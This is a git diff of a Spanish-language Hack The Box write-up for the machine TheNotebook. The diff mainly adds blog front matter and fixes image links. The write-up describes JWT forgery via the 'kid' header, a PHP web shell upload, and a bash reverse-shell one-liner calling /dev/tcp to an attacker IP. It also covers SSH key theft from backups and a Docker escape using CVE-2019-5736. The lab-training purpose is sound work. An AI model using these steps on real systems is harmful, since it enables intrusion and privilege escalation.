@@ -1,4 +1,23 @@
+---
+layout: single
+title: TheNoteBook - Hack The Box
+excerpt: ""
+date: 2023-11-30
+classes: wide
+header:
+  teaser: /assets/images/htb-writeup-thenotebook/thenotebook_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
+categories:
+  - hackthebox
+tags:
+  - subdomain enumeration
+  - abusing Upload File - Image to Text Flask Utility
+  - SSTI
+  - reading files through SSTI - SSH Private Key
+  - Abusing Cron Job (Privilege Escalation)
 
+---
 
 # PortScan
 ____
@@ -26,19 +45,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 # WebSite
 ____
-![[Pasted image 20231130165809.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130165809.png)
 
 Tendríamos una página web para registrarnos e iniciar sesión, así que creo una cuenta, para ver qué hay una vez logueados... tendríamos un apartado para crear notas, pruebo un **XSS** pero no logro resultados, sigo indagando, pero no encontré ninguna vulnerabilidades, así que opté por hacer una enumeración de posibles directorios con **GoBuster** y el diccionario "**SecLists**" pero tampoco encontré nada.
 
 Decidí fijarme en la **cookie de sesión**, viendo qué tenía la estructura de un **JWT**, fuí a la página [JWT.IO](https://jwt.io/) para ver su estructura.
-![[Pasted image 20231130170322.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130170322.png)
 
 Vemos qué en los **Headers** contiene un campo curioso con nombre "**kid**" y posterior a ello está aparentemente está haciendo un request una **clave privada** desde su **localhost** al puerto **:7070**, por lo qué aparentemente éste campo se debe a qué en las cabeceras carga directamente la firma o **signature** para hacer una comparativa con la signature "real"...
 
 También sinos fijamos en el **payload**, vemos qué está seteado el campo "**admin_cap**" como **falso**, así que a lo mejor si logro cargar una clave privada desde nuestra máquina puede ser que logré cambiar el mismo payload.
 
 1. Procedo a la estructura **Json** del payload & la cabecera.
-![[Pasted image 20231130171458.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130171458.png)
 
 2. Me creo una la clave privada usando "**openssl**".
 ```bash
@@ -54,7 +73,7 @@ cat privKey.key | xclip -sel clip
 
 
 Una vez hecho ésto, vemos qué se nos genará un nuevo **JWT**
-![[Pasted image 20231130171835.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130171835.png)
 
 5. Nos montamos un servidor en Python en la ubicación de la clave privada qué creamos con "**openssl**" para qué aplique la comparativa y sean correctas ambas claves privadas.
 
@@ -65,13 +84,13 @@ python3 -m http.server 7070
 6. Copiamos el nuevo **JWT** que nos generó **jwt.io** y lo usamos como un nuevo JWT para por último recargar la página.
 
 Vemos en consola qué obtiene la clave privada desde el servidor python.
-![[Pasted image 20231130173201.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173201.png)
 
 Viendo así un pestaña qué es un panel administrativo:
-![[Pasted image 20231130172504.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130172504.png)
 
 Podemos subir archivo, así que se me ocurre subir un **php** malicioso para controlar un **RCE** desde la URL por GET.
-![[Pasted image 20231130173001.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173001.png)
 
 ```bash
 touch cmd.php
@@ -83,10 +102,10 @@ que tendrá como contenido:
 
 
 He logrado subirlo éxitosamente.
-![[Pasted image 20231130173532.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173532.png)
 
 así que opto por verlo, & aparentemente está interpretando el PHP, lo corrobo con un "**whoami**".
-![[Pasted image 20231130173602.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130173602.png)
 
 
 Viendo que funcionó, me entablaré una **Reverse Shell**, sino hay reglas "**iptables**" de por medio lo lograré.
@@ -101,7 +120,7 @@ nc -nlvp PORT
 bash -c 'bash -i >%26/dev/tcp/10.10.14.x/PORT 0>%261'
 ```
 
-![[Pasted image 20231130174447.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130174447.png)
 
 Obtendríamos la **Reverse Shell,** tan sólo quedaría darle tratamiento a la TYY, para andar comodamente en la shell, sino sabemos como [((LEE ESTE POST))](https://4uli.github.io/tratamiento-tty/)
 
@@ -119,7 +138,7 @@ Listando los permisos, vemos qué podemos leerlo, así que se me ocurre descompr
 tar -xzf /var/backups/home.tar.gz
 ```
 
-![[Pasted image 20231130175945.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130175945.png)
 
 Pero no podemos descomprimirlo en éste directorio ya que aquí no tenemos permisos de escritura, así que lo moveré al directorio "**/tmp**".
 ```bash
@@ -149,7 +168,7 @@ ssh -i id_rsa noah@10.10.10.230
 ```
 
 y ya estaríamos como "noah"
-![[Pasted image 20231130180647.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130180647.png)
 
 
 # Escalada de Privilegios 2
@@ -160,14 +179,14 @@ Listando los permisos **SUDOERS**.
 sudo -l
 ```
 
-![[Pasted image 20231130181933.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130181933.png)
 
 Vemos qué podemos ejecutar como quién sea la instrucción de ejecutar el contenedor "**webaap-dev01**", por lo que se me ocurre ejecutarlo con "**sudo**" de forma qué entre al contenedor como **Root** y luego tratar de hacer un "**docker breakout**".
-![[Pasted image 20231130182114.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130182114.png)
 Pero sólo estamos en un contenedor, no estamos en la máquina real, así que intento hacer el **breakout**, o buscar posibles credenciales para root sin lograr encontrada nada...
 
 así que opto por ver la versión del **Docker** a ver sí encontramos alguna vulnerabilidad.
-![[Pasted image 20231130182233.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130182233.png)
 
 Vemos qué tiene una versión **18.06.0**, así que hago una búsqueda rápida en busca de vulnerabilidades para un "**breakout**" de esta versión.
 
@@ -175,7 +194,7 @@ Encontrando el siguiente **PoC** [CVE-2019-5736](https://github.com/Frichetten/C
 
 
 Modificamos el script de la siguiente manera:
-![[Pasted image 20231130183057.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130183057.png)
 
 Compilamos el script:
 ```bash
@@ -208,8 +227,8 @@ Una vez se ejecute, nos metemos desde otra ventana en el contenedor ejecutando u
 sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
 ```
 
-![[Pasted image 20231130184824.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130184824.png)
 
 Logrando darle permisos **SUID** a la bash de la máquina real, logrando así el **Docker breakout**.
-![[Pasted image 20231130184920.png]]
+![](/assets/images/htb-writeup-thenotebook/Pasted image 20231130184920.png)
 
